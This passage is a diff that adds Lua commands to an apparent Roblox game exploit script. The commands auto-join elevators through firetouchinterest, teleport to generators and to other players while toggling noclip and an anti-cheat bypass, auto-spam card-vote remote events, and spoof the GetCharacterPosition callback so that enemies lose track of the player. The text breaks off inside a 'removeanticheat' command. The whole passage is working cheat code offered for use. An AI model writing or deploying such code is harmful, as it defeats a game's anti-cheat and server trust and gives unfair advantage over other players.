+		local character = noxious["character"]
+		local root = character:WaitForChild("HumanoidRootPart")
+
+		local savedCFrame = root.CFrame
+
+		firetouchinterest(root, lal, 0)
+		task.wait()
+		firetouchinterest(root, lal, 1)
+
+		task.wait()
+		root.CFrame = savedCFrame
+	end
+
+	autojoinrunconnection = task.spawn(function()
+		while autojoinrunconnection do
+			task.wait(0)
+			for _, model in ipairs(workspace["Elevators"]:GetChildren()) do
+				if model:IsA("Model") and model.Name == "Gate" then
+					local gate = model:FindFirstChild("Gate")
+					local guiPart = model:FindFirstChild("GuiPart")
+					local surfaceGui = guiPart and guiPart:FindFirstChildOfClass("SurfaceGui")
+					local frame = surfaceGui and surfaceGui:FindFirstChild("Frame")
+					local playersLabel = frame and frame:FindFirstChild("players")
+					if gate and gate:IsA("BasePart")
+						and playersLabel and playersLabel:IsA("TextLabel")
+						or playersLabel.Text == "3/8"
+						or playersLabel.Text == "4/8"
+						or playersLabel.Text == "5/8"
+						or playersLabel.Text == "6/8"
+						or playersLabel.Text == "7/8" then
+						gog(gate)
+						break
+					end
+				end
+			end
+		end
+	end)
+end)
+
+addcommand("disableautojoinrun", "dajr", function()
+	autojoinrunconnection = nil
+end)
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+addcommand("joinelevator1", "je1", function()
+	local Players = game:GetService("Players")
+	local player = Players.LocalPlayer
+
+	local function findgate()
+		for _, model in ipairs(workspace["Elevators"]:GetChildren()) do
+			if model:IsA("Model") and model.Name == "Gate" then
+				local gate = model:FindFirstChild("Gate")
+				local partOne = model:FindFirstChild("1")
+				if gate and gate:IsA("BasePart") and partOne and partOne:IsA("BasePart") then
+					return gate
+				end
+			end
+		end
+		return nil
+	end
+
+	local function gog(lal)
+		local character = player.Character or player.CharacterAdded:Wait()
+		local root = character:WaitForChild("HumanoidRootPart")
+
+		local savedCFrame = root.CFrame
+
+		firetouchinterest(root, lal, 0)
+		task.wait()
+		firetouchinterest(root, lal, 1)
+
+		task.wait()
+		root.CFrame = savedCFrame
+	end
+
+	local gate = findgate()
+	if gate then
+		gog(gate)
+	end
+end)
+
+addcommand("joinelevator2", "je2", function()
+	local Players = game:GetService("Players")
+	local player = Players.LocalPlayer
+
+	local function findgate()
+		for _, model in ipairs(workspace["Elevators"]:GetChildren()) do
+			if model:IsA("Model") and model.Name == "Gate" then
+				local gate = model:FindFirstChild("Gate")
+				local partOne = model:FindFirstChild("2")
+				if gate and gate:IsA("BasePart") and partOne and partOne:IsA("BasePart") then
+					return gate
+				end
+			end
+		end
+		return nil
+	end
+
+	local function gog(lal)
+		local character = player.Character or player.CharacterAdded:Wait()
+		local root = character:WaitForChild("HumanoidRootPart")
+
+		local savedCFrame = root.CFrame
+
+		firetouchinterest(root, lal, 0)
+		task.wait(0.1)
+		firetouchinterest(root, lal, 1)
+
+		task.wait(0.1)
+		root.CFrame = savedCFrame
+	end
+
+	local gate = findgate()
+	if gate then
+		gog(gate)
+	end
+end)
+
+addcommand("joinelevator3", "je3", function()
+	local Players = game:GetService("Players")
+	local player = Players.LocalPlayer
+
+	local function findgate()
+		for _, model in ipairs(workspace["Elevators"]:GetChildren()) do
+			if model:IsA("Model") and model.Name == "Gate" then
+				local gate = model:FindFirstChild("Gate")
+				local partOne = model:FindFirstChild("3")
+				if gate and gate:IsA("BasePart") and partOne and partOne:IsA("BasePart") then
+					return gate
+				end
+			end
+		end
+		return nil
+	end
+
+	local function gog(lal)
+		local character = player.Character or player.CharacterAdded:Wait()
+		local root = character:WaitForChild("HumanoidRootPart")
+
+		local savedCFrame = root.CFrame
+
+		firetouchinterest(root, lal, 0)
+		task.wait(0.1)
+		firetouchinterest(root, lal, 1)
+
+		task.wait(0.1)
+		root.CFrame = savedCFrame
+	end
+
+	local gate = findgate()
+	if gate then
+		gog(gate)
+	end
+end)
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+local atptg_monitoring = false
+local atptg_connections = {}
+
+local function disconnectAll()
+	for _, conn in pairs(atptg_connections) do
+		if conn then conn:Disconnect() end
+	end
+	table.clear(atptg_connections)
+end
+
+local function teleportToGen()
+	task.spawn(function() execcmd("tptg") end)
+	task.wait(0.5)
+	task.spawn(function() execcmd("eatptg") end)
+	task.wait(0.5)
+	task.spawn(function() execcmd("eatptg") end)
+end
+
+addcommand("enableautoteleporttogenerator", "eatptg", function()
+	if atptg_monitoring then return end
+	atptg_monitoring = true
+
+	local player = game.Players.LocalPlayer
+	local character = player.Character or player.CharacterAdded:Wait()
+	character:WaitForChild("HumanoidRootPart")
+
+	local info = workspace:WaitForChild("Info")
+	local floorActive = info:WaitForChild("FloorActive")
+	local panic = info:WaitForChild("Panic")
+	local inGamePlayer = workspace:WaitForChild("InGamePlayers"):WaitForChild(game.Players.LocalPlayer.Name)
+	local decoding = inGamePlayer:WaitForChild("Decoding")
+
+	local floorTriggered = false
+
+	-- Handle FloorActive
+	local function checkFloorActive()
+		if floorActive.Value and not floorTriggered then
+			floorTriggered = true
+			teleportToGen()
+		end
+	end
+
+	checkFloorActive()
+
+	table.insert(atptg_connections, floorActive.Changed:Connect(function()
+		checkFloorActive()
+	end))
+
+	-- Handle Decoding repeatedly
+	table.insert(atptg_connections, decoding.Changed:Connect(function(newValue)
+		if newValue ~= nil and atptg_monitoring then
+			task.delay(1, function()
+				if decoding.Value ~= nil and atptg_monitoring then
+					teleportToGen()
+				end
+			end)
+		end
+	end))
+
+	-- Handle Panic reset logic
+	table.insert(atptg_connections, panic.Changed:Connect(function(newVal)
+		if newVal == false then
+			floorTriggered = false -- Reset so FloorActive can trigger again
+			checkFloorActive()     -- Immediately recheck in case it's still true
+		end
+	end))
+end)
+
+addcommand("disableautoteleporttogenerator", "datptg", function()
+	if not atptg_monitoring then return end
+	atptg_monitoring = false
+	disconnectAll()
+end)
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+extractingtpwalkconnection = nil
+extractingtpwalkdecodingconnection = nil
+extractingtpwalkismonitoring = false
+
+addcommand("enableextractingtpwalk", "eetpwalk", function(speed)
+	execcmd("detpwalk")
+	local player = noxious["local player"]
+	local character = player.Character or player.CharacterAdded:Wait()
+	character:WaitForChild("HumanoidRootPart")
+	local inGamePlayerModel = workspace:FindFirstChild("InGamePlayers"):FindFirstChild(player.Name)
+
+	local decodingObject = inGamePlayerModel:FindFirstChild("Decoding")
+	if extractingtpwalkismonitoring then return end
+
+	extractingtpwalkismonitoring = true
+
+	local function atptg2decodstat(isDecoding)
+		if isDecoding then
+			if speed and tonumber(speed) then
+				execcmd("tpwalk " .. tonumber(speed))
+			end
+		else
+			execcmd("untpwalk")
+		end
+	end
+
+	extractingtpwalkdecodingconnection = decodingObject.Changed:Connect(function(newValue)
+		atptg2tpdelay = 1
+		atptg2decodstat(newValue ~= nil)
+	end)
+
+	atptg2decodstat(decodingObject.Value ~= nil)
+end)
+
+addcommand("disableextractingtpwalk", "detpwalk", function()
+	if not extractingtpwalkismonitoring then return end
+
+	extractingtpwalkismonitoring = false
+
+	if extractingtpwalkdecodingconnection then
+		extractingtpwalkdecodingconnection:Disconnect()
+		extractingtpwalkdecodingconnection = nil
+	end
+
+	if extractingtpwalkconnection then
+		extractingtpwalkconnection:Disconnect()
+		extractingtpwalkconnection = nil
+	end
+
+	execcmd("untpwalk")
+end)
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+function isConnieActive(generator)
+	local statsFolder = generator:FindFirstChild("Stats")
+	local connie = statsFolder and statsFolder:FindFirstChild("Connie")
+	if connie and connie:IsA("BoolValue") and connie.Value then
+		return true
+	end
+	return false
+end
+
+teleportingtogenerator = false
+
+addcommand("teleporttogenerator", "tptg", function()
+	if teleportingtogenerator then return end
+	teleportingtogenerator = true
+
+	local wasnoclipping = noclipping
+	local wasbypassinganticheat = bypassingantichea
+
+	task.wait(0.5)
+
+	task.spawn(function() execcmd("noclip") end)
+	task.spawn(function() execcmd("eacb") end)
+
+	local player = noxious["local player"]
+	local character = player.Character or player.CharacterAdded:Wait()
+	local humanoidRootPart = character:WaitForChild"HumanoidRootPart"
+
+	local currentRoom = workspace:FindFirstChild("CurrentRoom")
+	if currentRoom then
+		for _, item in pairs(currentRoom:GetChildren()) do
+			if item:IsA("Model") then
+				local generatorsFolder = item:FindFirstChild("Generators")
+				if generatorsFolder then
+					local generators = {}
+					for _, generator in pairs(generatorsFolder:GetChildren()) do
+						if generator:IsA("Model") and generator.PrimaryPart then
+							local statsFolder = generator:FindFirstChild("Stats")
+							if statsFolder then
+								local completedValue = statsFolder:FindFirstChild("Completed")
+								local activeplayer = statsFolder:FindFirstChild("ActivePlayer")
+								if completedValue and completedValue:IsA("BoolValue") and not completedValue.Value and not activeplayer.Value then
+									if not isConnieActive(generator) then
+										table.insert(generators, generator)
+									end
+								end
+							end
+						end
+					end
+
+					if not wasnoclipping then task.spawn(function() task.wait(0.8) execcmd("clip") end) end
+					if not wasbypassinganticheat then task.spawn(function() task.wait(0.8) execcmd("dacb") teleportingtogenerator = false end) end
+
+					if #generators > 0 then
+						local randomGenerator = generators[math.random(1, #generators)]
+						local generatorCFrame = randomGenerator:GetPrimaryPartCFrame()
+						local forwardPosition = generatorCFrame.Position + generatorCFrame.LookVector * 4
+						local targetCFrame = CFrame.new(forwardPosition, generatorCFrame.Position) * CFrame.new(0, 2.3, 0)
+
+						tpbypass(targetCFrame)
+					end
+				end
+			end
+		end
+	end
+end)
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+function findplr(partialName)
+	for _, player in ipairs(game.Players:GetPlayers()) do
+		if player.Name:lower():sub(1, #partialName) == partialName:lower() then
+			return player
+		end
+	end
+	return nil
+end
+
+teleporttingtolayer = false
+
+addcommand("teleportto", "to", function(args)
+	if teleporttingtolayer then return end
+	teleporttingtolayer = true
+
+	local player = noxious["local player"]
+	local character = player.Character or player.CharacterAdded:Wait()
+	local humanoidRootPart = character:WaitForChild"HumanoidRootPart"
+
+	local targetPlayer
+	if args:lower() == "random" then
+		local players = game.Players:GetPlayers()
+		if #players > 0 then
+			targetPlayer = players[math.random(1, #players)]
+		end
+	else
+		targetPlayer = findplr(args)
+	end
+
+	if targetPlayer then
+		local targetCharacter = targetPlayer.Character
+		local targetRootPart = targetCharacter.HumanoidRootPart
+		local behindPosition = targetRootPart.CFrame * CFrame.new(0, 0, 3)
+		if not inrun() then
+			if targetCharacter and targetCharacter:FindFirstChild("HumanoidRootPart")then
+				humanoidRootPart.CFrame = behindPosition
+			end
+		else
+			local wasbypassinganticheat = bypassinganticheat
+			task.spawn(function() execcmd("eacb") end)
+			tpbypass(behindPosition)
+			if not wasbypassinganticheat then task.spawn(function() execcmd("dacb") end) end
+			teleporttingtolayer = false
+		end
+	end
+end)
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+addcommand("teleporttoadminroom", "tptar", function()
+	local character = noxious["character"]
+	local humanoidRootPart = character:WaitForChild"HumanoidRootPart"		
+	local targetPosition = Vector3.new(-43, 21, 24)
+	humanoidRootPart.CFrame = CFrame.new(targetPosition)
+end)
+
+addcommand("teleporttobedroom", "tptbr", function()
+	local character = noxious["character"]
+	local humanoidRootPart = character:WaitForChild"HumanoidRootPart"		
+	local targetPosition = Vector3.new(-130, 40, 26)
+	humanoidRootPart.CFrame = CFrame.new(targetPosition)
+end)
+
+addcommand("teleporttodandysshop", "tptds", function()
+	local character = noxious["character"]
+	local humanoidRootPart = character:WaitForChild"HumanoidRootPart"		
+	local targetPosition = Vector3.new(-19, 21, 17)
+	humanoidRootPart.CFrame = CFrame.new(targetPosition)
+end)
+
+addcommand("teleporttoboxofdoom", "tptbod", function()
+	local character = noxious["character"]
+	local humanoidRootPart = character:WaitForChild"HumanoidRootPart"		
+	local targetPosition = Vector3.new(-215, 3, -215)
+	humanoidRootPart.CFrame = CFrame.new(targetPosition)
+end)
+
+addcommand("teleporttostage", "tpts", function()
+	local character = noxious["character"]
+	local humanoidRootPart = character:WaitForChild"HumanoidRootPart"		
+	local targetPosition = Vector3.new(-3, 33, 492)
+	humanoidRootPart.CFrame = CFrame.new(targetPosition)
+end)
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+autovotebestcardenabled = false
+autovotebestcardthread = nil
+
+function voteBestCard()
+	task.spawn(function()
+		local cardVote = workspace:WaitForChild("Info"):WaitForChild("CardVote")
+		local event = game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("CardVoteEvent")
+
+		local heal = cardVote:FindFirstChild("DandyDiscount")
+
+		if heal then
+			event:FireServer(heal)
+		end
+	end)
+	task.spawn(function()
+		local cardVote = workspace:WaitForChild("Info"):WaitForChild("CardVote")
+		local event = game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("CardVoteEvent")
+
+		local heal = cardVote:FindFirstChild("Elevator")
+		local heal2 = cardVote:FindFirstChild("Elevator2")
+
+		if heal then
+			event:FireServer(heal)
+		end
+
+		if heal2 then
+			event:FireServer(heal2)
+		end
+	end)
+	task.spawn(function()
+		local cardVote = workspace:WaitForChild("Info"):WaitForChild("CardVote")
+		local event = game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("CardVoteEvent")
+
+		local heal = cardVote:FindFirstChild("SurvivalPoint")
+		local heal2 = cardVote:FindFirstChild("SurvivalPoint2")
+
+		if heal then
+			event:FireServer(heal)
+		end
+
+		if heal2 then
+			event:FireServer(heal2)
+		end
+	end)
+	task.spawn(function()
+		local cardVote = workspace:WaitForChild("Info"):WaitForChild("CardVote")
+		local event = game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("CardVoteEvent")
+
+		local heal = cardVote:FindFirstChild("RandomItem")
+		local heal2 = cardVote:FindFirstChild("RandomItem2")
+
+		if heal then
+			event:FireServer(heal)
+		end
+
+		if heal2 then
+			event:FireServer(heal2)
+		end
+	end)
+	task.spawn(function()
+		local cardVote = workspace:WaitForChild("Info"):WaitForChild("CardVote")
+		local event = game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("CardVoteEvent")
+
+		local heal = cardVote:FindFirstChild("ItemRarity")
+		local heal2 = cardVote:FindFirstChild("ItemRarity2")
+
+		if heal then
+			event:FireServer(heal)
+		end
+
+		if heal2 then
+			event:FireServer(heal2)
+		end
+	end)
+	task.spawn(function()
+		local cardVote = workspace:WaitForChild("Info"):WaitForChild("CardVote")
+		local event = game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("CardVoteEvent")
+
+		local heal = cardVote:FindFirstChild("AbilityCooldown")
+		local heal2 = cardVote:FindFirstChild("AbilityCooldown2")
+
+		if heal then
+			event:FireServer(heal)
+		end
+
+		if heal2 then
+			event:FireServer(heal2)
+		end
+	end)
+	task.spawn(function()
+		local cardVote = workspace:WaitForChild("Info"):WaitForChild("CardVote")
+		local event = game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("CardVoteEvent")
+
+		local heal = cardVote:FindFirstChild("GlowLight")
+
+		if heal then
+			event:FireServer(heal)
+		end
+	end)
+	task.spawn(function()
+		local cardVote = workspace:WaitForChild("Info"):WaitForChild("CardVote")
+		local event = game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("CardVoteEvent")
+
+		local heal = cardVote:FindFirstChild("MonsterPanicReduction")
+
+		if heal then
+			event:FireServer(heal)
+		end
+	end)
+	task.spawn(function()
+		local heal = cardVote:FindFirstChild("ItemRarity")
+		local heal2 = cardVote:FindFirstChild("ItemRarity2")
+
+		if heal then
+			event:FireServer(heal)
+		end
+
+		if heal2 then
+			event:FireServer(heal2)
+		end
+	end)
+	task.spawn(function()
+		local cardVote = workspace:WaitForChild("Info"):WaitForChild("CardVote")
+		local event = game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("CardVoteEvent")
+
+		local heal = cardVote:FindFirstChild("Stamina")
+		local heal2 = cardVote:FindFirstChild("Stamina2")
+
+		if heal then
+			event:FireServer(heal)
+		end
+
+		if heal2 then
+			event:FireServer(heal2)
+		end
+	end)
+	task.spawn(function()
+		local cardVote = workspace:WaitForChild("Info"):WaitForChild("CardVote")
+		local event = game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("CardVoteEvent")
+		local players = game:GetService("Players"):GetPlayers()
+
+		local shouldVote = true
+
+		for _, player in ipairs(players) do
+			local inGamePlayer = workspace:FindFirstChild("InGamePlayers")
+			local playerModel = inGamePlayer and inGamePlayer:FindFirstChild(player.Name)
+			local healthValue = playerModel and playerModel:FindFirstChild("Health")
+
+			if healthValue and healthValue:IsA("IntValue") and healthValue.Value >= 3 then
+				shouldVote = false
+				break
+			end
+		end
+
+		if shouldVote then
+			local heal = cardVote:FindFirstChild("Heal")
+			local heal2 = cardVote:FindFirstChild("Heal2")
+
+			if heal then
+				event:FireServer(heal)
+			end
+
+			if heal2 then
+				event:FireServer(heal2)
+			end
+		end
+	end)
+	task.spawn(function()
+		local cardVote = workspace:WaitForChild("Info"):WaitForChild("CardVote")
+		local event = game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("CardVoteEvent")
+
+		local heal = cardVote:FindFirstChild("Machine")
+
+		if heal then
+			event:FireServer(heal)
+		end
+	end)
+end
+
+function monitorCardVoteFolder()
+	local cardVoteFolder = workspace:WaitForChild("Info"):WaitForChild("CardVote")
+
+	local function tryVote()
+		if not autovotebestcardenabled or alreadyVoted then return end
+
+		task.delay(1, function()
+			if not autovotebestcardenabled or alreadyVoted then return end
+			if #cardVoteFolder:GetChildren() > 0 then
+				voteBestCard()
+				alreadyVoted = true
+			end
+		end)
+	end
+
+	cardVoteFolder.ChildAdded:Connect(function()
+		tryVote()
+	end)
+
+	cardVoteFolder.ChildRemoved:Connect(function()
+		if #cardVoteFolder:GetChildren() == 0 then
+			alreadyVoted = false
+		end
+	end)
+
+	if #cardVoteFolder:GetChildren() > 0 then
+		tryVote()
+	end
+end
+
+addcommand("enableautovotebestcard", "eavbc", function()
+	if autovotebestcardenabled then return end
+	autovotebestcardenabled = true
+	alreadyVoted = false
+	task.spawn(monitorCardVoteFolder)
+end)
+
+addcommand("disableautovotebestcard", "davbc", function()
+	autovotebestcardenabled = false
+	alreadyVoted = false
+end)
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+autovotehealrunning = false
+autovotehealthread = nil
+
+addcommand("enableautovotehealcard", "eavhc", function()
+	autovotehealrunning = true
+
+	if autovotehealrunning then
+		autovotehealthread = task.spawn(function()
+			while autovotehealrunning do
+				local cardVote = workspace:WaitForChild("Info"):WaitForChild("CardVote")
+				local event = game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("CardVoteEvent")
+
+				local heal = cardVote:FindFirstChild("Heal")
+				local heal2 = cardVote:FindFirstChild("Heal2")
+
+				if heal then
+					event:FireServer(heal)
+				end
+
+				if heal2 then
+					event:FireServer(heal2)
+				end
+
+				task.wait(1)
+			end
+		end)
+	end
+end)
+
+addcommand("disableautovotehealcard", "davhc", function()
+	autovotehealrunning = false
+end)
+
+autovotetechsavvyrunning = false
+autovotetechsavvythread = nil
+
+addcommand("enableautovotetechsavvycard", "eavtsc", function()
+	autovotetechsavvyrunning = true
+
+	if autovotetechsavvyrunning then
+		autovotetechsavvythread = task.spawn(function()
+			while autovotetechsavvyrunning do
+				local cardVote = workspace:WaitForChild("Info"):WaitForChild("CardVote")
+				local event = game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("CardVoteEvent")
+
+				local heal = cardVote:FindFirstChild("Machine")
+
+				if heal then
+					event:FireServer(heal)
+				end
+
+				task.wait(1)
+			end
+		end)
+	end
+end)
+
+addcommand("disableautovotetechsavvycard", "davtsc", function()
+	autovotetechsavvyrunning = false
+end)
+
+autovoteblindgrabrunning = false
+autovoteblindgrabthread = nil
+
+addcommand("enableautovoteblindgrabcard", "eavbgc", function()
+	autovoteblindgrabrunning = true
+
+	if autovoteblindgrabrunning then
+		autovoteblindgrabthread = task.spawn(function()
+			while autovoteblindgrabrunning do
+				local cardVote = workspace:WaitForChild("Info"):WaitForChild("CardVote")
+				local event = game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("CardVoteEvent")
+
+				local heal = cardVote:FindFirstChild("RandomItem")
+				local heal2 = cardVote:FindFirstChild("RandomItem2")
+
+				if heal then
+					event:FireServer(heal)
+				end
+
+				if heal2 then
+					event:FireServer(heal2)
+				end
+
+				task.wait(1)
+			end
+		end)
+	end
+end)
+
+addcommand("disableautovoteblindgrabcard", "davbgc", function()
+	autovoteblindgrabrunning = false
+end)
+
+autovotetapesrunning = false
+autovotetapesthread = nil
+
+addcommand("enableautovotetapescard", "eavtc", function()
+	autovotetapesrunning = true
+
+	if autovotetapesrunning then
+		autovotetapesthread = task.spawn(function()
+			while autovotetapesrunning do
+				local cardVote = workspace:WaitForChild("Info"):WaitForChild("CardVote")
+				local event = game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("CardVoteEvent")
+
+				local heal = cardVote:FindFirstChild("SurvivalPoint")
+				local heal2 = cardVote:FindFirstChild("SurvivalPoint2")
+
+				if heal then
+					event:FireServer(heal)
+				end
+
+				if heal2 then
+					event:FireServer(heal2)
+				end
+
+				task.wait(1)
+			end
+		end)
+	end
+end)
+
+addcommand("disableautovotetapescard", "davtc", function()
+	autovotetapesrunning = false
+end)
+
+autovotefrugalrunning = false
+autovotefrugalthread = nil
+
+addcommand("enableautovotefrugalcard", "eavfc", function()
+	autovotefrugalrunning = true
+
+	if autovotefrugalrunning then
+		autovotefrugalthread = task.spawn(function()
+			while autovotefrugalrunning do
+				local cardVote = workspace:WaitForChild("Info"):WaitForChild("CardVote")
+				local event = game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("CardVoteEvent")
+
+				local heal = cardVote:FindFirstChild("DandyDiscount")
+
+				if heal then
+					event:FireServer(heal)
+				end
+
+				task.wait(1)
+			end
+		end)
+	end
+end)
+
+addcommand("disableautovotefrugalcard", "davfc", function()
+	autovotefrugalrunning = false
+end)
+
+autovoteelevatortimerunning = false
+autovoteelevatortimethread = nil
+
+addcommand("enableautovoteelevatortimecard", "eavetc", function()
+	autovoteelevatortimerunning = true
+
+	if autovoteelevatortimerunning then
+		autovoteelevatortimethread = task.spawn(function()
+			while autovoteelevatortimerunning do
+				local cardVote = workspace:WaitForChild("Info"):WaitForChild("CardVote")
+				local event = game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("CardVoteEvent")
+
+				local heal = cardVote:FindFirstChild("Elevator")
+				local heal2 = cardVote:FindFirstChild("Elevator2")
+
+				if heal then
+					event:FireServer(heal)
+				end
+
+				if heal2 then
+					event:FireServer(heal2)
+				end
+
+				task.wait(1)
+			end
+		end)
+	end
+end)
+
+addcommand("disableautovoteelevatortimecard", "davetc", function()
+	autovoteelevatortimerunning = false
+end)
+
+autovotemaxstaminarunning = false
+autovotemaxstaminathread = nil
+
+addcommand("enableautovotemaxstaminacard", "eavmsc", function()
+	autovotemaxstaminarunning = true
+
+	if autovotemaxstaminarunning then
+		autovotemaxstaminathread = task.spawn(function()
+			while autovotemaxstaminarunning do
+				local cardVote = workspace:WaitForChild("Info"):WaitForChild("CardVote")
+				local event = game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("CardVoteEvent")
+
+				local heal = cardVote:FindFirstChild("Stamina")
+				local heal2 = cardVote:FindFirstChild("Stamina2")
+
+				if heal then
+					event:FireServer(heal)
+				end
+
+				if heal2 then
+					event:FireServer(heal2)
+				end
+
+				task.wait(1)
+			end
+		end)
+	end
+end)
+
+addcommand("disableautovotemaxstaminacard", "davmsc", function()
+	autovotemaxstaminarunning = false
+end)
+
+autovotesparkplugrunning = false
+autovotesparkplugthread = nil
+
+addcommand("enableautovotesparkplugcard", "eavsgc", function()
+	autovotesparkplugrunning = true
+
+	if autovotesparkplugrunning then
+		autovotesparkplugthread = task.spawn(function()
+			while autovotesparkplugrunning do
+				local cardVote = workspace:WaitForChild("Info"):WaitForChild("CardVote")
+				local event = game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("CardVoteEvent")
+
+				local heal = cardVote:FindFirstChild("GlowLight")
+
+				if heal then
+					event:FireServer(heal)
+				end
+
+				task.wait(1)
+			end
+		end)
+	end
+end)
+
+addcommand("disableautovotesparkplugcard", "davsgc", function()
+	autovotesparkplugrunning = false
+end)
+
+autovoteelectricianrunning = false
+autovoteelectricianthread = nil
+
+addcommand("enableautovoteelectriciancard", "eavec", function()
+	autovoteelectricianrunning = true
+
+	if autovoteelectricianrunning then
+		autovoteelectricianthread = task.spawn(function()
+			while autovoteelectricianrunning do
+				local cardVote = workspace:WaitForChild("Info"):WaitForChild("CardVote")
+				local event = game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("CardVoteEvent")
+
+				local heal = cardVote:FindFirstChild("BlackOut")
+
+				if heal then
+					event:FireServer(heal)
+				end
+
+				task.wait(1)
+			end
+		end)
+	end
+end)
+
+addcommand("disableautovoteelectriciancard", "davec", function()
+	autovoteelectricianrunning = false
+end)
+
+autovotecovetousrunning = false
+autovotecovetousthread = nil
+
+addcommand("enableautovotecovetouscard", "eavcc", function()
+	autovotecovetousrunning = true
+
+	if autovotecovetousrunning then
+		autovotecovetousthread = task.spawn(function()
+			while autovotecovetousrunning do
+				local cardVote = workspace:WaitForChild("Info"):WaitForChild("CardVote")
+				local event = game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("CardVoteEvent")
+
+				local heal = cardVote:FindFirstChild("ItemRarity")
+				local heal2 = cardVote:FindFirstChild("ItemRarity2")
+
+				if heal then
+					event:FireServer(heal)
+				end
+
+				if heal2 then
+					event:FireServer(heal2)
+				end
+
+				task.wait(1)
+			end
+		end)
+	end
+end)
+
+addcommand("disableautovotecovetouscard", "davcc", function()
+	autovotecovetousrunning = false
+end)
+
+autovotesuppressionrunning = false
+autovotesuppressionthread = nil
+
+addcommand("enableautovotesuppressioncard", "eavsnc", function()
+	autovotesuppressionrunning = true
+
+	if autovotesuppressionrunning then
+		autovotesuppressionthread = task.spawn(function()
+			while autovotesuppressionrunning do
+				local cardVote = workspace:WaitForChild("Info"):WaitForChild("CardVote")
+				local event = game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("CardVoteEvent")
+
+				local heal = cardVote:FindFirstChild("MonsterPanicReduction")
+
+				if heal then
+					event:FireServer(heal)
+				end
+
+				task.wait(1)
+			end
+		end)
+	end
+end)
+
+addcommand("disableautovotesuppressioncard", "davsnc", function()
+	autovotesuppressionrunning = false
+end)
+
+autovoteabilityrunning = false
+autovoteabilitythread = nil
+
+addcommand("enableautovoteabilitycard", "eavac", function()
+	autovoteabilityrunning = true
+
+	if autovoteabilityrunning then
+		autovoteabilitythread = task.spawn(function()
+			while autovoteabilityrunning do
+				local cardVote = workspace:WaitForChild("Info"):WaitForChild("CardVote")
+				local event = game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("CardVoteEvent")
+
+				local heal = cardVote:FindFirstChild("AbilityCooldown")
+				local heal2 = cardVote:FindFirstChild("AbilityCooldown2")
+
+				if heal then
+					event:FireServer(heal)
+				end
+
+				if heal2 then
+					event:FireServer(heal2)
+				end
+
+				task.wait(1)
+			end
+		end)
+	end
+end)
+
+addcommand("disableautovoteabilitycard", "davac", function()
+	autovoteabilityrunning = false
+end)
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+autovoterandomcardenabled = false
+lastcardvoted = nil
+autovoterandomcardthread = nil
+
+cardvotes = {
+	"Heal",
+	"Heal2",
+	"RandomItem",
+	"RandomItem2",
+	"SurvivalPoint",
+	"SurvivalPoint2",
+	"DandyDiscount",
+	"Elevator",
+	"Elevator2",
+	"Stamina",
+	"Stamina2",
+	"GlowLight",
+	"BlackOut",
+	"ItemRarity",
+	"ItemRarity2",
+	"MonsterPanicReduction",
+	"Machine",
+	"Machine2",
+	"AbilityCooldown",
+	"AbilityCooldown2",
+}
+
+addcommand("enableautovoterandomcard", "eavrc", function()
+	if autovoterandomcardenabled then
+		return
+	end
+
+	autovoterandomcardenabled = true
+	autovoterandomcardthread = task.spawn(function()
+		local ReplicatedStorage = game:GetService("ReplicatedStorage")
+		local Events = ReplicatedStorage:WaitForChild("Events")
+		local voteEvent = Events:WaitForChild("CardVoteEvent")
+		local Info = workspace:WaitForChild("Info")
+		local CardVote = Info:WaitForChild("CardVote")
+
+		while autovoterandomcardenabled do
+			local availableCards = {}
+
+			for _, name in ipairs(cardvotes) do
+				local card = CardVote:FindFirstChild(name)
+				if card and card ~= lastcardvoted then
+					table.insert(availableCards, card)
+				end
+			end
+
+			if #availableCards > 0 then
+				local pick = availableCards[math.random(1, #availableCards)]
+				lastcardvoted = pick
+				voteEvent:FireServer(pick)
+			end
+
+			task.wait()
+		end
+	end)
+end)
+
+addcommand("disableautovoterandomcard", "davrc", function()
+	if not autovoterandomcardenabled then
+		return
+	end
+
+	autovoterandomcardenabled = false
+end)
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+addcommand("enableavoidtwisteds", "eadt", function()
+	game:GetService("ReplicatedStorage").Events.GetCharacterPosition.OnClientInvoke = function()
+		return Vector3.one * 9e9
+	end;
+end)
+
+addcommand("disableavoidtwisteds", "dadt", function()
+	local ReplicatedStorage = game:GetService("ReplicatedStorage")
+	local Events = ReplicatedStorage:WaitForChild("Events")
+	Events.GetCharacterPosition.OnClientInvoke = nil
+end)
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+addcommand("removeanticheat", "rac", function()
+	local ReplicatedStorage = game:GetService("ReplicatedStorage")		
+	local eventsFolder = ReplicatedStorage:FindFirstChild("Events")
+
+	if eventsFolder then
+		local antiCheatTrigger = eventsFolder:FindFirstChild("AntiCheatTrigger")			
+		if antiCheatTrigger then
